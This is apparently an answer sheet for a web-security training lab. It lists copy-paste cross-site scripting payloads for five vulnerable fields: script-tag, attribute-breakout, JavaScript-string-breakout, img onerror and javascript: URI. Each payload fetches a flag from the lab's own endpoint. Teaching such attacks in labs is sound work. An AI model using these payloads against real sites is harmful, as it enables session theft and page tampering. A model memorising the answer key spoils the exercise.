# Lab 8.1: Simple Payloads (One-Liner)

## Lab A: Search Box

**Copy this → Paste in search box → Click "Run Search"**

```html
<script>alert('XSS Works')</script>
```

**Or to get flag:**
```html
<script>fetch('/xss-success?variant=A').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))</script>
```

---

## Lab B: Alt Text Field

**Copy this → Paste in Alt Text → Fill other fields → Click Upload**

```html
" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="
```

---

## Lab C: Description Field

**Copy this → Paste in Description → Fill other fields (Title, Category) → Click Publish**

**Important: Lab C is inside JavaScript context - it breaks out of a string**

```javascript
test"; fetch('/xss-success?variant=C').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));//
```

**What happens inside:**
```javascript
var projectDescription = "test"; fetch('/xss-success?variant=C').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));//"
```

**Key differences from Lab A:**
- First `"` closes the string
- Semicolon `;` ends the variable assignment  
- **Space before fetch** is important (detection pattern looks for `"; fetch`)
- fetch() is a NEW statement (your code)
- `//` comments out the rest

---

## Lab D: Post Content

**Copy this → Paste in Post → Click "Post to Feed"**

```html
<img src=x onerror="fetch('/xss-success?variant=D').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))">
```

---

## Lab E: Source Field

**Copy this → Paste in Source → Click Provision → Scroll down → CLICK "Open" Link**

```javascript
javascript:fetch('/xss-success?variant=E').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));void(0)
```

---

## Summary

| Lab | Payload |
|-----|---------|
| **A** | `<script>fetch('/xss-success?variant=A').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))</script>` |
| **B** | `" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="` |
| **C** | `test"; fetch('/xss-success?variant=C').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));//` |
| **D** | `<img src=x onerror="fetch('/xss-success?variant=D').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))">` |
| **E** | `javascript:fetch('/xss-success?variant=E').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));void(0)` |

---

## What You'll See

- **Alert popup** = XSS executed + Flag captured
- **Alert shows "Flag: FLAG!lab8..."** = Success
- Copy the flag and submit

---

## Steps (Same for all labs)

1. Find the vulnerable field for your lab
2. Copy the payload (it fetches flag automatically)
3. Paste it
4. Submit form (or click link for Lab E)
5. Alert popup shows flag = SUCCESS
6. Copy flag from alert and submit

Done!
